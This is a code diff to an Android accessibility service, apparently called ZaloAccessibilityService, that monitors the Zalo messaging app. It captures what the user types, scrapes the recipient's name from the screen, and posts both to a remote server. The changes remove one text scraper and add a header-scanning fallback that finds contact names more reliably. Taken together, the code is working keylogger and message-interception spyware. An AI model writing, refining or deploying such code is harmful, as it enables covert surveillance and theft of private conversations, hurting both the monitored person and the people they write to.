@@ -2,6 +2,7 @@ package com.example.cetena1
 
 import android.accessibilityservice.AccessibilityService
 import android.content.Context
+import android.graphics.Rect
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
@@ -22,15 +23,10 @@ class ZaloAccessibilityService : AccessibilityService() {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         val pkg = event.packageName?.toString() ?: ""
-        
-        // Log để kiểm tra tên gói Zalo thật sự trên máy bạn
-        // Log.e("ZaloTracker", "Sự kiện từ: $pkg")
-
         if (!pkg.contains("zalo")) return
 
         try {
             when (event.eventType) {
-                // Theo dõi gõ phím liên tục
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                     val text = event.text.joinToString("")
                     if (text.isNotBlank() && text != "[]") {
@@ -39,28 +35,17 @@ class ZaloAccessibilityService : AccessibilityService() {
                     }
                 }
 
-                // Khi màn hình thay đổi (Zalo chuẩn bị gửi hoặc cập nhật UI)
-                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                    val rootNode = rootInActiveWindow ?: return
-                    val currentText = findInputText(rootNode)
-                    if (currentText.isNotBlank()) {
-                        lastCapturedText = currentText
-                    }
-                }
-
-                // Khi phát hiện bấm nút (Bất kỳ nút nào)
                 AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                     if (lastCapturedText.isNotBlank()) {
-                        Log.e("ZaloTracker", "🚀 PHÁT HIỆN GỬI: $lastCapturedText")
                         val rootNode = rootInActiveWindow
                         val name = if (rootNode != null) findContactName(rootNode) else "Người dùng Zalo"
                         
+                        Log.e("ZaloTracker", "🚀 GỬI TỚI $name: $lastCapturedText")
                         sendToMessageCenter(name, lastCapturedText)
                         
-                        // Không xóa ngay lập tức để tránh mất dữ liệu nếu nhấn nhiều lần
-                        val textToSend = lastCapturedText
+                        val sentText = lastCapturedText
                         android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                            if (lastCapturedText == textToSend) lastCapturedText = ""
+                            if (lastCapturedText == sentText) lastCapturedText = ""
                         }, 500)
                     }
                 }
@@ -70,31 +55,16 @@ class ZaloAccessibilityService : AccessibilityService() {
         }
     }
 
-    private fun findInputText(rootNode: AccessibilityNodeInfo): String {
-        val ids = arrayOf(
-            "com.zing.zalo:id/chat_input_field", 
-            "com.vng.zalo:id/chat_input_field", 
-            "com.zing.zalo:id/input_field",
-            "com.zing.zalo:id/tv_chat_input"
-        )
-        for (id in ids) {
-            val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
-            if (nodes != null && nodes.isNotEmpty()) {
-                val text = nodes[0].text?.toString() ?: ""
-                nodes.forEach { it.recycle() }
-                if (text.isNotBlank()) return text
-            }
-        }
-        return ""
-    }
-
     private fun findContactName(rootNode: AccessibilityNodeInfo): String {
+        // Danh sách ID ưu tiên
         val ids = arrayOf(
             "com.zing.zalo:id/chat_title_name", 
             "com.vng.zalo:id/chat_title_name", 
             "com.zing.zalo:id/tv_header_title",
+            "com.zing.zalo:id/tv_title",
             "com.zing.zalo:id/name"
         )
+        
         for (id in ids) {
             val nodes = rootNode.findAccessibilityNodeInfosByViewId(id)
             if (nodes != null && nodes.isNotEmpty()) {
@@ -103,7 +73,30 @@ class ZaloAccessibilityService : AccessibilityService() {
                 if (name.isNotBlank()) return name
             }
         }
-        return "Người dùng Zalo"
+
+        // CÁCH DỰ PHÒNG: Tìm mọi TextView nằm ở phần trên cùng màn hình (Header)
+        return scanForHeaderTitle(rootNode) ?: "Người dùng Zalo"
+    }
+
+    private fun scanForHeaderTitle(node: AccessibilityNodeInfo?): String? {
+        if (node == null) return null
+        
+        // Nếu là TextView và nằm ở vùng Y từ 50 đến 200 (thường là Header)
+        if (node.className == "android.widget.TextView") {
+            val rect = Rect()
+            node.getBoundsInScreen(rect)
+            if (rect.top > 50 && rect.top < 200 && rect.height() > 30) {
+                val text = node.text?.toString()
+                if (!text.isNullOrBlank() && text.length < 50) return text
+            }
+        }
+
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i)
+            val result = scanForHeaderTitle(child)
+            if (result != null) return result
+        }
+        return null
     }
 
     private fun sendToMessageCenter(name: String, message: String) {
@@ -117,10 +110,10 @@ class ZaloAccessibilityService : AccessibilityService() {
         val request = Request.Builder().url(url).post(body).build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
-                Log.e("ZaloTracker", "❌ GỬI THẤT BẠI: ${e.message}")
+                Log.e("ZaloTracker", "❌ LỖI GỬI: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
-                Log.e("ZaloTracker", "✅ ĐÃ GỬI OUTBOUND THÀNH CÔNG!")
+                Log.e("ZaloTracker", "✅ ĐÃ GỬI THÀNH CÔNG!")
                 response.close()
             }
         })
